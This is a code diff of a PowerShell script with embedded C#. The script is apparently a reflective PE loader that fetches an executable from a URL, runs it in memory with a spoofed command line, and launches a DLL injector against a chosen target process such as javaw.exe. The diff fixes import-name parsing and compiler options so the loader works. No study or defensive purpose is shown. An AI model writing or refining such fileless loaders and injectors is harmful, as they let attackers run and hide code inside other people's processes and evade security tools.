@@ -1,4 +1,4 @@
-# loader.ps1 — full reflective PE loader with command line spoofing
+# loader.ps1 â€” full reflective PE loader with command line spoofing
 # usage: .\loader.ps1 -Url "https://..." -DllPath "C:\dll.dll" -TargetProc "javaw.exe"
 
 param(
@@ -64,17 +64,11 @@ public unsafe class ReflectiveExeLoader
         return 0;
     }
 
+    // sections are mapped at image-relative offsets, so VA = base + RVA directly
     static long RvaToVa(IntPtr baseAddr, byte[] pe, ushort numSec, int secStart, uint rva)
     {
-        for (int i = 0; i < numSec; i++)
-        {
-            int off = secStart + i * 40;
-            uint vSize = BitConverter.ToUInt32(pe, off + 8);
-            uint vAddr = BitConverter.ToUInt32(pe, off + 12);
-            if (rva >= vAddr && rva < vAddr + Math.Max(vSize, 1))
-                return baseAddr.ToInt64() + (rva - vAddr);
-        }
-        return 0;
+        if (rva == 0) return 0;
+        return baseAddr.ToInt64() + rva;
     }
 
     static string ReadCString(byte[] buf, int offset)
@@ -257,8 +251,7 @@ public unsafe class ReflectiveExeLoader
                     if (nameOff <= 0) break;
                     string dllName = ReadCString(exeBytes, nameOff).ToLower();
 
-                    if (dllName.Contains("kernel32"))
-                    {
+                    if (dllName.Contains("kernel32")) {
                         long intVa  = RvaToVa(mem, exeBytes, numSec, secStart, origThunkRva);
                         long iatVa  = RvaToVa(mem, exeBytes, numSec, secStart, iatRva);
                         if (intVa == 0 || iatVa == 0) { cur += 20; continue; }
@@ -271,7 +264,8 @@ public unsafe class ReflectiveExeLoader
 
                             long fnameVa = RvaToVa(mem, exeBytes, numSec, secStart, (uint)(thunkName & 0xFFFFFFFF));
                             if (fnameVa == 0) continue;
-                            string fnName = ReadCStringAt((byte*)fnameVa);
+                            // +2 skips the WORD hint field of IMAGE_IMPORT_BY_NAME
+                            string fnName = ReadCStringAt((byte*)(fnameVa + 2));
 
                             if (fnName == "GetCommandLineA")
                             {
@@ -342,7 +336,10 @@ public unsafe class ReflectiveExeLoader
 }
 '@
 
-Add-Type -TypeDefinition $cs -Language CSharp -CompilerOptions "/unsafe"
+$cparams = New-Object System.CodeDom.Compiler.CompilerParameters
+$cparams.CompilerOptions = "/unsafe"
+$cparams.ReferencedAssemblies.AddRange(@("System.dll", "System.Core.dll"))
+Add-Type -TypeDefinition $cs -CompilerParameters $cparams
 
 $cmdLine = "`"TXCInjector.exe`" `"$DllPath`" `"$TargetProc`""
 Write-Host "[*] running..."
@@ -350,3 +347,5 @@ Write-Host "[*] running..."
 $result = [ReflectiveExeLoader]::LoadAndRun($exeBytes, $cmdLine)
 
 if ($result -eq 0) { Write-Host "[+] success" } else { Write-Host "[-] exit code $result" }
+
+
